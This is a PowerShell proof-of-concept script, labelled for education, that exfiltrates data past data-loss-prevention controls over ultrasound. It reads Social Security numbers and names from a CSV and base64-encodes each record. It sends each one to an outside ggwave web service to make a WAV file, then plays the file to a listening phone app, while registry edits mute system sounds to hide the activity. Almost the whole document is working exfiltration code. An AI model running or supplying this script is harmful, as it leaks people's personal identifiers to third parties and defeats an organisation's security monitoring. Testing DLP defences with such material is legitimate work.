#DLP Exfil PoC by Dennis Chow GPLv2.0 dchow[AT]xtecsystems.com
#2021-Feb-03. For education and learning only.
#Open Waver App in Phone/App with ACTIVE window receive
#Run the PS script with appropriate permissions
$data_csv = Import-Csv .\sample-data.csv
$wavplayer = New-Object System.Media.SoundPlayer
 
#stop the powershell system default notification beeps/dings temporarily
$regpath = "HKCU:\AppEvents\Schemes\Apps"
$reg_keyname = '(Default)'
$sound_value_none = '.None'
 
#Backup registry
#& "reg.exe export HKCU:\AppEvents\Schemes\Apps sound-schemes-bak.reg"
#Start-Process -FilePath "reg.exe" -ArgumentList 'export HKCU:\AppEvents\Schemes\Apps sound-schemes-bak.reg'
Write-Host "Backing up sound settings in registry..." -ForegroundColor Yellow
reg.exe export HKCU\AppEvents\Schemes\Apps sound-schemes-bak.reg

#Inconsistent results using win32 cmd utils using try/catch
if ($LASTEXITCODE -ne 0) { 
Write-Host "Do not continue w/o reg backup" -ForegroundColor Red; exit 
}

#Set 'No Sound' Schemes
New-itemProperty -path $regpath -Name $reg_keyname -value $sound_value_none -force
#Apply change
Get-ChildItem -Path "HKCU:\AppEvents\Schemes\Apps" |
Get-ChildItem | 
Get-ChildItem | 
Where-Object { $_.PSChildName -eq ".Current" } | 
Set-ItemProperty -Name "(Default)" -Value ""

 $data_csv | ForEach-Object {
    $input = $_.SSN + ' ' + $_.'First Name' + ' ' + $_.'Last Name'
    Write-Host "Encoding: " $input
    $data_bin_bytes = [System.Text.Encoding]::ASCII.GetBytes($input)
    $data_base64_string = [Convert]::ToBase64String($data_bin_bytes)
    
    #Need slow down clobbering file during playback and API throttling
    $seconds = (Get-Random -Minimum 2 -Maximum 4)
    Start-Sleep -Seconds $seconds
    
    #Write-Host $data_base64_string &p=4 is ultrasound parameter
    #See https://github.com/ggerganov/ggwave
    Write-Host "Waiting for API throttle timer and downloading wave file" -ForegroundColor DarkGreen
    Invoke-WebRequest -Uri "https://ggwave-to-file.ggerganov.com/?m=$data_base64_string&p=4" `
    -ErrorAction Ignore -OutFile 'dataexfil.wav'
    
    #Allow file handle to close
    Start-Sleep -Seconds 0.5
    
    #play the ultrasound file each loop using default app ext
    Write-Host "Playing ultrasound... results depend on noise level in room/volume" -ForegroundColor Yellow
    $wavplayer.SoundLocation=.\dataexfil.wav
    $wavplayer.PlaySync()
    
    #Allow time for receiver to buffer the data depending throttle or background noise
    Start-Sleep -Seconds 20 
 }

#Restore Default Sound Scheme
Write-Host "Restoring registry sound settings..." -ForegroundColor Green
reg.exe import sound-schemes-bak.reg
Start-Sleep -Seconds 0.5
if ($LASTEXITCODE -ne 0) { 
Write-Host "Import failed. Manually Restore Registry Backup" -ForegroundColor Red; exit 
}
#Remove backup
Remove-Item -Path sound-schemes-bak.reg